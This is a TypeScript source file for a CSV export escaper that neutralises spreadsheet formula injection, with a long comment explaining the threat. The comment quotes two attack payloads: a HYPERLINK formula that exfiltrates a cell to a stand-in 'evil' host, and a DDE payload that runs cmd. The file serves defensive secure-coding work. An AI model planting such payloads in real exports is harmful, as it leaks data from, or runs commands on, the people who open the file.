// The ONE CSV cell escaper. Two existed — routes/evidence.ts's toCsv and
// modules/reports/reports.ts's reportToCsv — with byte-identical logic and the
// same hole in both.
//
// ---------------------------------------------------------------------------
// WHY A LEADING = IS A SECURITY PROBLEM AND A LEADING , IS NOT
// ---------------------------------------------------------------------------
// Both escapers quoted cells containing a quote, comma or newline, which makes
// the file parse correctly. Neither neutralised a cell that BEGINS with a
// formula character, which is a different problem: Excel, LibreOffice and
// Google Sheets evaluate such a cell on open.
//
// The payload does not have to be exotic. `=HYPERLINK("https://evil/"&A1,"Open")`
// exfiltrates the neighbouring cell to an attacker's server the moment a
// founder clicks it, and DDE payloads like `=cmd|'/c calc'!A0` still execute in
// older Excel with one confirmation prompt that reads like a normal macro
// warning.
//
// And the cells here are externally controlled. An evidence export carries bank
// narration, order numbers, customer-supplied notes and courier remarks — text
// this system copies verbatim from providers and from whoever typed it into a
// checkout. So the attacker is not the person downloading the file; it is
// whoever placed an order, and the victim is the founder auditing their own
// books. Quoting alone does not help: Excel strips the quotes and evaluates
// what is inside.
//
// The fix is a leading apostrophe, which every spreadsheet reads as "this cell
// is text". It is visible in the formula bar and invisible in the cell, so a
// legitimate value starting with `-` (a negative amount, already common in
// these exports) still reads correctly.

/** Characters that make a spreadsheet treat a cell as an expression. */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Escape one cell for CSV: neutralise formulas, then quote if needed.
 *
 * Exported on its own so the neutralisation is unit-testable without building
 * a whole report — a security control that only runs inside a route handler is
 * one whose behaviour nobody asserts.
 */
export function escapeCsvCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return "";
  let s = String(value);

  // NUMBERS ARE EXEMPT, and this is why the check is on the ORIGINAL type
  // rather than on the string. Every negative money figure in these exports
  // starts with "-", and prefixing all of them would put an apostrophe in front
  // of every refund and adjustment in the file — turning real numbers into text
  // that no longer sums in a spreadsheet, which is the whole point of exporting
  // to one. A JS number cannot carry a formula.
  const isNumeric = typeof value === "number";
  if (!isNumeric && s.length > 0 && FORMULA_PREFIXES.includes(s[0]!)) {
    s = `'${s}`;
  }

  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** Rows → CSV, headers taken from the first row's keys. */
export function toCsv(rows: Array<Record<string, string | number | null>>): string {
  if (rows.length === 0) return "";
  const headers = Object.keys(rows[0]!);
  return [
    headers.map((h) => escapeCsvCell(h)).join(","),
    ...rows.map((r) => headers.map((h) => escapeCsvCell(r[h] ?? null)).join(",")),
  ].join("\n");
}
